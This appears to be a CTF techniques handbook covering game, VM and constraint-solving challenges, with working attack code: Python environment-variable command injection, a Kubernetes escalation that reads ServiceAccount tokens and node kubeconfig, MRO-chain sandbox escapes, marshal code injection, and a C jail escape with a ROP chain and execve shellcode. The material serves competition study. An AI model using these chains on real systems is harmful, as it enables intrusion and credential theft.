# CTF Misc - Games, VMs & Constraint Solving (Part 1)

## Table of Contents
- [WASM Game Exploitation via Patching](#wasm-game-exploitation-via-patching)
- [Roblox Place File Reversing](#roblox-place-file-reversing)
- [PyInstaller Extraction](#pyinstaller-extraction)
  - [Opcode Remapping](#opcode-remapping)
- [Marshal Code Analysis](#marshal-code-analysis)
  - [Bytecode Inspection Tips](#bytecode-inspection-tips)
- [Python Environment RCE](#python-environment-rce)
- [Z3 Constraint Solving](#z3-constraint-solving)
  - [YARA Rules with Z3](#yara-rules-with-z3)
  - [Type Systems as Constraints](#type-systems-as-constraints)
- [Kubernetes RBAC Bypass](#kubernetes-rbac-bypass)
  - [K8s Privilege Escalation Checklist](#k8s-privilege-escalation-checklist)
- [Floating-Point Precision Exploitation](#floating-point-precision-exploitation)
  - [Finding Exploitable Values](#finding-exploitable-values)
  - [Exploitation Strategy](#exploitation-strategy)
  - [Why It Works](#why-it-works)
  - [Red Flags in Challenges](#red-flags-in-challenges)
  - [Quick Test Script](#quick-test-script)
- [Custom Assembly Language Sandbox Escape (EHAX 2026)](#custom-assembly-language-sandbox-escape-ehax-2026)
- [memfd_create Packed Binaries](#memfd_create-packed-binaries)
- [Multi-Phase Interactive Crypto Game (EHAX 2026)](#multi-phase-interactive-crypto-game-ehax-2026)
- [References](#references)
- [Python Marshal Code Injection (iCTF 2013)](#python-marshal-code-injection-ictf-2013)
- [Benford's Law Frequency Distribution Bypass (iCTF 2013)](#benfords-law-frequency-distribution-bypass-ictf-2013)
- [Parallel Connection Oracle Relay (Hack.lu 2015)](#parallel-connection-oracle-relay-hacklu-2015)
- [Nonogram Solver to QR Code Pipeline (SECCON 2015)](#nonogram-solver-to-qr-code-pipeline-seccon-2015)
- [100 Prisoners Problem / Cycle-Following Strategy (Sharif CTF 2016)](#100-prisoners-problem--cycle-following-strategy-sharif-ctf-2016)
- [C Code Jail Escape via Emoji Identifiers and Gadget Embedding (Midnight Flag 2026)](#c-code-jail-escape-via-emoji-identifiers-and-gadget-embedding-midnight-flag-2026)

---

## WASM Game Exploitation via Patching

**Pattern (Tac Tic Toe, Pragyan 2026):** Game with unbeatable AI in WebAssembly. Proof/verification system validates moves but doesn't check optimality.

**Key insight:** If the proof generation depends only on move positions and seed (not on whether moves were optimal), patching the WASM to make the AI play badly produces a beatable game with valid proofs.

**Patching workflow:**
```bash
# 1. Convert WASM binary to text format
wasm2wat main.wasm -o main.wat

# 2. Find the minimax function (look for bestScore initialization)
# Change initial bestScore from -1000 to 1000
# Flip comparison: i64.lt_s -> i64.gt_s (selects worst moves instead of best)

# 3. Recompile
wat2wasm main.wat -o main_patched.wasm
```

**Exploitation:**
```javascript
const go = new Go();
const result = await WebAssembly.instantiate(
  fs.readFileSync("main_patched.wasm"), go.importObject
);
go.run(result.instance);

InitGame(proof_seed);
// Play winning moves against weakened AI
for (const m of [0, 3, 6]) {
    PlayerMove(m);
}
const data = GetWinData();
// Submit data.moves and data.proof to server -> valid!
```

**General lesson:** In client-side game challenges, always check if the verification/proof system is independent of move quality. If so, patch the game logic rather than trying to beat it.

---

## Roblox Place File Reversing

**Pattern (MazeRunna, 0xFun 2026):** Roblox game where the flag is hidden in an older published version. Latest version contains a decoy flag.

**Step 1: Identify target IDs from game page HTML:**
```python
placeId = 75864087736017
universeId = 8920357208
```

**Step 2: Pull place versions via Roblox Asset Delivery API:**
```bash
# Requires .ROBLOSECURITY cookie (rotate after CTF!)
for v in 1 2 3; do
  curl -H "Cookie: .ROBLOSECURITY=..." \
    "https://assetdelivery.roblox.com/v2/assetId/${PLACE_ID}/version/$v" \
    -o place_v${v}.rbxlbin
done
```

**Step 3: Parse .rbxlbin binary format:**
The Roblox binary place format contains typed chunks:
- **INST** — defines class buckets (Script, Part, etc.) and referent IDs
- **PROP** — per-instance property values (including `Source` for scripts)
- **PRNT** — parent→child relationships forming the object tree

```python
# Pseudocode for extracting scripts
for chunk in parse_chunks(data):
    if chunk.type == 'PROP' and chunk.field == 'Source':
        for referent, source in chunk.entries:
            if source.strip():
                print(f"[{get_path(referent)}] {source}")
```

**Step 4: Diff script sources across versions.**
- v3 (latest): `Workspace/Stand/Color/Script` → fake flag
- v2 (older): same path → real flag

**Key lessons:**
- Always check **version history** — latest version may be a decoy
- Roblox Asset Delivery API exposes all published versions
- Rotate `.ROBLOSECURITY` cookie immediately after use (it's a full session token)

---

## PyInstaller Extraction

```bash
python pyinstxtractor.py packed.exe
# Look in packed.exe_extracted/
```

### Opcode Remapping
If decompiler fails with opcode errors:
1. Find modified `opcode.pyc`
2. Build mapping to original values
3. Patch target .pyc
4. Decompile normally

---

## Marshal Code Analysis

```python
import marshal, dis
with open('file.bin', 'rb') as f:
    code = marshal.load(f)
dis.dis(code)
```

### Bytecode Inspection Tips
- `co_consts` contains literal values (strings, numbers)
- `co_names` contains referenced names (function names, variables)
- `co_code` is the raw bytecode
- Use `dis.Bytecode(code)` for instruction-level iteration

---

## Python Environment RCE

```bash
PYTHONWARNINGS=ignore::antigravity.Foo::0
BROWSER="/bin/sh -c 'cat /flag' %s"
```

**Other dangerous environment variables:**
- `PYTHONSTARTUP` - Script executed on interactive startup
- `PYTHONPATH` - Inject modules via path hijacking
- `PYTHONINSPECT` - Drop to interactive shell after script

**How PYTHONWARNINGS works:** Setting `PYTHONWARNINGS=ignore::antigravity.Foo::0` triggers `import antigravity`, which opens a URL via `$BROWSER`. Control `$BROWSER` to execute arbitrary commands.

---

## Z3 Constraint Solving

```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()
s.add(flag[0] == ord('f'))  # Known prefix
# Add constraints...
if s.check() == sat:
    print(bytes([s.model()[f].as_long() for f in flag]))
```

### YARA Rules with Z3
```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()

# Literal bytes
for i, byte in enumerate([0x66, 0x6C, 0x61, 0x67]):
    s.add(flag[i] == byte)

# Character range
for i in range(4):
    s.add(flag[i] >= ord('A'))
    s.add(flag[i] <= ord('Z'))

if s.check() == sat:
    m = s.model()
    print(bytes([m[f].as_long() for f in flag]))
```

### Type Systems as Constraints
**OCaml GADTs / advanced types encode constraints.**

Don't compile - extract constraints with regex and solve with Z3:
```python
import re
from z3 import *

matches = re.findall(r"\(\s*([^)]+)\s*\)\s*(\w+)_t", source)
# Convert to Z3 constraints and solve
```

---

## Kubernetes RBAC Bypass

**Pattern (CTFaaS, LACTF 2026):** Container deployer with claimed ServiceAccount isolation.

**Attack chain:**
1. Deploy probe container that reads in-pod ServiceAccount token at `/var/run/secrets/kubernetes.io/serviceaccount/token`
2. Verify token can impersonate deployer SA (common misconfiguration)
3. Create pod with `hostPath` volume mounting `/` -> read node filesystem
4. Extract kubeconfig (e.g., `/etc/rancher/k3s/k3s.yaml`)
5. Use node credentials to access hidden namespaces and read secrets

```bash
# From inside pod:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/hidden/secrets/flag
```

### K8s Privilege Escalation Checklist
- Check RBAC: `kubectl auth can-i --list`
- Look for pod creation permissions (can create privileged pods)
- Check for hostPath volume mounts allowed in PSP/PSA
- Look for secrets in environment variables of other pods
- Check for service mesh sidecars leaking credentials

---

## Floating-Point Precision Exploitation

**Pattern (Spare Me Some Change):** Trading/economy games where large multipliers amplify tiny floating-point errors.

**Key insight:** When decimal values (0.01-0.99) are multiplied by large numbers (e.g., 1e15), floating-point representation errors create fractional remainders that can be exploited.

### Finding Exploitable Values
```python
mult = 1000000000000000  # 10^15

# Find values where multiplication creates useful fractional errors
for i in range(1, 100):
    x = i / 100.0
    result = x * mult
    frac = result - int(result)
    if frac > 0:
        print(f'x={x}: {result} (fraction={frac})')

# Common values with positive fractions:
# 0.07 -> 70000000000000.0078125
# 0.14 -> 140000000000000.015625
# 0.27 -> 270000000000000.03125
# 0.56 -> 560000000000000.0625
```

### Exploitation Strategy
1. **Identify the constraint**: Need `balance >= price` AND `inventory >= fee`
2. **Find favorable FP error**: Value where `x * mult` has positive fraction
3. **Key trick**: Sell the INTEGER part of inventory, keeping the fractional "free money"

**Example (time-travel trading game):**
```text
Initial: balance=5.00, inventory=0.00, flag_price=5.00, fee=0.05
Multiplier: 1e15 (time travel)

# Buy 0.56, travel through time:
balance = (5.0 - 0.56) * 1e15 = 4439999999999999.5
inventory = 0.56 * 1e15 = 560000000000000.0625

# Sell exactly 560000000000000 (integer part):
balance = 4439999999999999.5 + 560000000000000 = 5000000000000000.0 (FP rounds!)
inventory = 560000000000000.0625 - 560000000000000 = 0.0625 > 0.05 fee

# Now: balance >= flag_price AND inventory >= fee
```

### Why It Works
- Float64 has ~15-16 significant digits precision
- `(5.0 - 0.56) * 1e15` loses precision -> rounds to exact 5e15 when added
- `0.56 * 1e15` keeps the 0.0625 fraction as "free inventory"
- The asymmetric rounding gives you slightly more total value than you started with

### Red Flags in Challenges
- "Time travel amplifies everything" (large multipliers)
- Trading games with buy/sell + special actions
- Decimal currency with fees or thresholds
- "No decimals allowed" after certain operations (forces integer transactions)
- Starting values that seem impossible to win with normal math

### Quick Test Script
```python
def find_exploit(mult, balance_needed, inventory_needed):
    """Find x where selling int(x*mult) gives balance>=needed with inv>=needed"""
    for i in range(1, 500):
        x = i / 100.0
        if x >= 5.0:  # Can't buy more than balance
            break
        inv_after = x * mult
        bal_after = (5.0 - x) * mult

        # Sell integer part of inventory
        sell = int(inv_after)
        final_bal = bal_after + sell
        final_inv = inv_after - sell

        if final_bal >= balance_needed and final_inv >= inventory_needed:
            print(f'EXPLOIT: buy {x}, sell {sell}')
            print(f'  final_balance={final_bal}, final_inventory={final_inv}')
            return x
    return None

# Example usage:
find_exploit(1e15, 5e15, 0.05)  # Returns 0.56
```

---

## Custom Assembly Language Sandbox Escape (EHAX 2026)

**Pattern (Chusembly):** Web app with custom instruction set (LD, PUSH, PROP, CALL, IDX, etc.) running on a Python backend. Safety check only blocks the word "flag" in source code.

**Key insight:** `PROP` (property access) and `CALL` (function invocation) instructions allow traversing Python's MRO chain from any object to achieve RCE, similar to Jinja2 SSTI.

**Exploit chain:**
```text
LD 0x48656c6c6f A     # Load "Hello" string into register A
PROP __class__ A      # str → <class 'str'>
PROP __base__ E       # str → <class 'object'> (E = result register)
PROP __subclasses__ E # object → bound method
CALL E                # object.__subclasses__() → list of all classes
# Find os._wrap_close at index 138 (varies by Python version)
IDX 138 E             # subclasses[138] = os._wrap_close
PROP __init__ E       # get __init__ method
PROP __globals__ E    # access function globals
# Use __getitem__ to access builtins without triggering keyword filter
PUSH 0x5f5f6275696c74696e735f5f  # "__builtins__" as hex
CALL __getitem__ E               # globals["__builtins__"]
# Bypass "flag" keyword filter with hex encoding
PUSH 0x666c61672e747874          # "flag.txt" as hex
CALL open E                      # open("flag.txt")
CALL read E                      # read file contents
STDOUT E                         # print flag
```

**Filter bypass techniques:**
- **Hex-encoded strings:** `0x666c61672e747874` → `"flag.txt"` bypasses keyword filters
- **os.popen for shell:** If file path is unknown, use `os.popen('ls /').read()` then `os.popen('cat /flag*').read()`
- **Subclass index discovery:** Iterate through `__subclasses__()` list to find useful classes (os._wrap_close, subprocess.Popen, etc.)

**General approach for custom language challenges:**
1. **Read the docs:** Check `/docs`, `/help`, `/api` endpoints for instruction reference
2. **Find the result register:** Many custom languages have a special register for return values
3. **Test string handling:** Try hex-encoded strings to bypass keyword filters
4. **Chain Python MRO:** Any Python string object → `__class__.__base__.__subclasses__()` → RCE
5. **Error messages leak info:** Intentional errors reveal Python internals and available classes

---

## memfd_create Packed Binaries

```python
from Crypto.Cipher import ARC4
cipher = ARC4.new(b"key")
decrypted = cipher.decrypt(encrypted_data)
open("dumped", "wb").write(decrypted)
```

---

## Multi-Phase Interactive Crypto Game (EHAX 2026)

**Pattern (The Architect's Gambit):** Server presents a multi-phase challenge combining cryptography, game theory, and commitment-reveal protocols.

**Phase structure:**
1. **Phase 1 (AES-ECB decryption):** Decrypt pile values with provided key. Determine winner from game state.
2. **Phase 2 (AES-CBC with derived keys):** Keys derived via SHA-256 chain from Phase 1 results. Decrypt to get game parameters.
3. **Phase 3 (Interactive gameplay):** Play optimal moves in a combinatorial game, bound by commitment-reveal protocol.

**Commitment-reveal (HMAC binding):**
```python
import hmac, hashlib

def compute_binding_token(session_nonce, answer):
    """Server verifies your answer commitment before revealing result."""
    message = f"answer:{answer}".encode()
    return hmac.new(session_nonce, message, hashlib.sha256).hexdigest()

# Flow: send token first, then server reveals state, then send answer
# Server checks: HMAC(nonce, answer) == your_token
# Prevents changing your answer after seeing the state
```

**GF(2^8) arithmetic for game drain calculations:**
```python
# Galois Field GF(256) used in some game mechanics (Nim variants)
# Nim-value XOR determines winning/losing positions

def gf256_mul(a, b, poly=0x11b):
    """Multiply in GF(2^8) with irreducible polynomial."""
    result = 0
    while b:
        if b & 1:
            result ^= a
        a <<= 1
        if a & 0x100:
            a ^= poly
        b >>= 1
    return result

# Nim game with GF(256) move rules:
# Position is losing if Nim-value (XOR of pile Grundy values) is 0
# Optimal move: find pile where removing stones makes XOR sum = 0
```

**Game tree memoization (C++ for performance):**
```python
# Python too slow for large state spaces — use C++ with memoization
# State compression: encode all pile sizes into single integer
# Cache: unordered_map<state_t, bool> for win/loss determination

# Python fallback for small games:
from functools import lru_cache

@lru_cache(maxsize=None)
def is_winning(state):
    """Returns True if current player can force a win."""
    state = tuple(sorted(state))  # Normalize for caching
    for move in generate_moves(state):
        next_state = apply_move(state, move)
        if not is_winning(next_state):
            return True  # Found a move that puts opponent in losing position
    return False  # All moves lead to opponent winning
```

**Key insights:**
- Multi-phase challenges require solving each phase sequentially — each phase's output feeds the next
- HMAC commitment-reveal prevents guessing; you must compute the correct answer
- GF(256) Nim variants require Sprague-Grundy theory, not brute force
- When Python recursion is too slow (>10s), rewrite game solver in C++ with state compression and memoization

---

## References
- Pragyan 2026 "Tac Tic Toe": WASM minimax patching
- LACTF 2026 "CTFaaS": K8s RBAC bypass via hostPath
- 0xL4ugh CTF: PyInstaller + opcode remapping
- 0xFun 2026 "MazeRunna": Roblox version history + binary place file parsing
- EHAX 2026 "The Architect's Gambit": Multi-phase AES + HMAC + GF(256) Nim
- EHAX 2026 "Chusembly": Custom assembly language with Python MRO chain RCE

---

---

## Python Marshal Code Injection (iCTF 2013)

**Pattern:** Server deserializes base64-encoded `marshal` data and executes it as a Python function. Inject arbitrary code via serialized function code objects.

```python
import marshal, types, base64

# Craft payload function that exfiltrates data over the socket
payload = lambda sock: sock.send(globals()['flag'].encode())

# Serialize the function's code object
serialized = base64.b64encode(marshal.dumps(payload.__code__)).decode()

# Server-side execution pattern:
# func = types.FunctionType(marshal.loads(base64.b64decode(data)), globals())
# func(client_socket)
```

**Key insight:** `marshal.loads()` is as dangerous as `pickle.loads()` — it deserializes arbitrary Python code objects. Unlike pickle, marshal is rarely sandboxed. The injected function runs with access to the server's `globals()`, enabling flag exfiltration via the socket connection.

---

## Benford's Law Frequency Distribution Bypass (iCTF 2013)

**Pattern:** Server validates that input digit frequency matches Benford's Law distribution (±5% tolerance). Craft input with correct digit distribution to pass the check.

```python
import random

# Benford's Law: P(d) = log10(1 + 1/d) for leading digit d (1-9)
benford = {d: round(100 * (1 + 1/d) / sum(1/i for i in range(1,10))) for d in range(1,10)}
# Approx: 1→30%, 2→18%, 3→12%, 4→10%, 5→8%, 6→7%, 7→6%, 8→5%, 9→5%

def generate_benford_compliant(length=1000):
    digits = []
    for d, pct in benford.items():
        digits.extend([str(d)] * int(length * pct / 100))
    random.shuffle(digits)
    return ''.join(digits[:length])
```

**Key insight:** Benford's Law describes the frequency of leading digits in naturally occurring datasets. If a service validates digit distribution, generate compliant input rather than random numbers. Tolerance is typically ±5%, so approximate percentages work.

---

## Parallel Connection Oracle Relay (Hack.lu 2015)

When a server generates deterministic sequences and provides feedback, exploit multiple simultaneous connections to share answers:

1. Open N+1 connections with identical timing (same PRNG seed)
2. Sacrifice one connection per round to discover the correct answer
3. Relay discovered answer to remaining connections via synchronization

```python
import threading

NUM_CONNECTIONS = 101
barriers = [threading.Barrier(NUM_CONNECTIONS - i) for i in range(100)]
correct_answers = [None] * 100

def worker(index, sock):
    for round_num in range(100):
        barriers[round_num].wait()  # Synchronize all threads

        if index == round_num:
            # This thread sacrifices itself to probe
            for guess in range(100):
                sock.send(str(guess).encode())
                response = sock.recv(1024)
                if b'correct' in response:
                    correct_answers[round_num] = guess
                    break
        else:
            # Wait for oracle thread to find answer
            barriers[round_num].wait()
            sock.send(str(correct_answers[round_num]).encode())

threads = [threading.Thread(target=worker, args=(i, connections[i])) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
```

**Key insight:** Works against any service where multiple connections share state (same PRNG seed from identical connection times). The sacrifice pattern ensures at least one connection survives all rounds.

---

## Nonogram Solver to QR Code Pipeline (SECCON 2015)

Automate solving nonogram puzzles that produce QR codes:

1. **Parse constraints** from web interface (BeautifulSoup for HTML tables)
2. **Solve nonogram** using external solver or constraint propagation
3. **Render to image** and decode QR

```python
from PIL import Image
import subprocess, qrtools

# Parse row/column constraints from HTML
rows = parse_constraints(html, 'rows')   # [[3,1], [2,2], ...]
cols = parse_constraints(html, 'cols')

# Feed to nonogram solver (e.g., nonogram-0.9)
solver_input = format_for_solver(rows, cols)
result = subprocess.run(['./nonogram'], input=solver_input, capture_output=True)

# Convert text grid to QR image
grid = parse_solver_output(result.stdout)
cell_size = 10
img = Image.new('RGB', (len(grid[0]) * cell_size, len(grid) * cell_size), 'white')
# Draw black cells where grid == '#'

# Decode QR
qr = qrtools.QR()
qr.decode('qrcode.png')
answer = qr.data
```

**Key insight:** Nonogram solvers are available as command-line tools. The key challenge is parsing the web interface and converting output to a valid QR image. Add quiet zones (white border) around the QR for reliable decoding.

---

## 100 Prisoners Problem / Cycle-Following Strategy (Sharif CTF 2016)

The classic 100 prisoners problem appears in CTF challenges as an "impossible" probability game:

- N prisoners each open N/2 boxes looking for their number
- All must succeed for the group to win
- Optimal strategy: follow permutation cycles (success rate ~31%)

```python
def solve_prisoners(boxes):
    """Follow cycle starting from own number"""
    N = len(boxes)
    results = []
    for prisoner in range(N):
        current = prisoner
        found = False
        for _ in range(N // 2):
            if boxes[current] == prisoner:
                found = True
                break
            current = boxes[current]  # Follow the cycle
        results.append(found)
    return all(results)
```

**Key insight:** Random strategy succeeds with probability (1/2)^N ≈ 0. Cycle-following succeeds with probability 1 - ln(2) ≈ 0.3069 for large N. The game fails only if any cycle exceeds length N/2. Pre-check cycle lengths if the box arrangement is known.

---

## C Code Jail Escape via Emoji Identifiers and Gadget Embedding (Midnight Flag 2026)

Escape a C code jail that bans all alphanumeric characters, whitespace, and most operators by using GCC's Unicode identifier support and embedding machine code gadgets inside arithmetic constants.

**Constraints:** Only `(){}[];,=.+*%@#~` and emoji allowed. No letters, digits, whitespace, quotes, or `?&!|$<>^:/-`.

### Step 1: Integer construction from emoji

GCC allows emoji as identifiers. `(😃==😃)` is compile-time constant `1`. Build any integer via addition and multiplication:

```c
// Building 15: 3 * (2*2 + 1)
((😃==😃)+(😃==😃)+(😃==😃))*(((😃==😃)+(😃==😃))*((😃==😃)+(😃==😃))+(😃==😃))
```

### Step 2: Embed gadgets via add eax constant encoding

At `-O0`, `var = var + CONSTANT` compiles to `05 XX XX XX XX` (add eax, imm32). Jump to offset+1 to execute the constant bytes as instructions:

| Target bytes | Instruction | Constant (decimal) |
|---|---|---|
| `0f 05 c3` | syscall; ret | 12780815 |
| `58 c3` | pop rax; ret | 50008 |
| `5f c3` | pop rdi; ret | 50015 |
| `5a c3` | pop rdx; ret | 50010 |
| `5e c3` | pop rsi; ret | 50014 |
| `54 5e 0f 05` | push rsp; pop rsi; syscall | 84893268 |

```c
// Each gadget function embeds one instruction sequence:
😇(){😼=😼+<12780815_as_emoji_expr>;}  // syscall; ret at 😇+15
```

### Step 3: Stack-based ROP via push rsp; pop rsi; syscall

Call the `push rsp; pop rsi; syscall` gadget with `sys_read` args to write a ROP chain directly to the stack return address:

```c
// (gadget_func + 15)(stdin=0, buf=ignored_rsp_used, len=4096)
😀(){(😃+<15_expr>)(😷,😸,<4096_expr>);}
```

The `push rsp` captures the return address location, `pop rsi` sets it as the read buffer, then `syscall` reads attacker input onto the stack.

### Step 4: ROP chain to mprotect + read + shellcode

```python
from pwn import *

rop = flat([
    0xdeadbeef,      # consumed by pop rbp
    POP_RAX, 10,     # sys_mprotect
    POP_RDI, 0x404000,
    POP_RSI, 0x2000,
    POP_RDX, 7,      # PROT_READ|WRITE|EXEC
    SYSCALL_RET,
    POP_RAX, 0,      # sys_read
    POP_RDI, 0,      # stdin
    POP_RSI, 0x404020,
    POP_RDX, 0x200,
    SYSCALL_RET,
    0x404020,         # jump to shellcode
])
```

### Step 5: Shellcode with glob for unknown flag path

```python
# execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"], NULL)
shellcode = asm(shellcraft.execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"]))
```

**Key insight:** GCC's `-static -nostartfiles -nostdlib` produces a minimal binary with deterministic addresses (no ASLR). Each emoji function lands at a predictable address (0x401000, 0x40101c, ...). The `add eax, imm32` encoding is the key primitive — any 4-byte gadget sequence can be embedded as an arithmetic constant in a valid C expression.

**Compilation flags to watch for:** `-nostartfiles -nostdlib -static` indicates no libc, no CRT, deterministic layout — ideal for address-hardcoded exploits.

---

See also: [games-and-vms-2.md](games-and-vms-2.md) for ML weight perturbation negation, cookie checkpoint brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, LoRA adapter merging, De Bruijn sequences, Brainfuck instrumentation, WASM memory manipulation, and neural network encoder collisions.
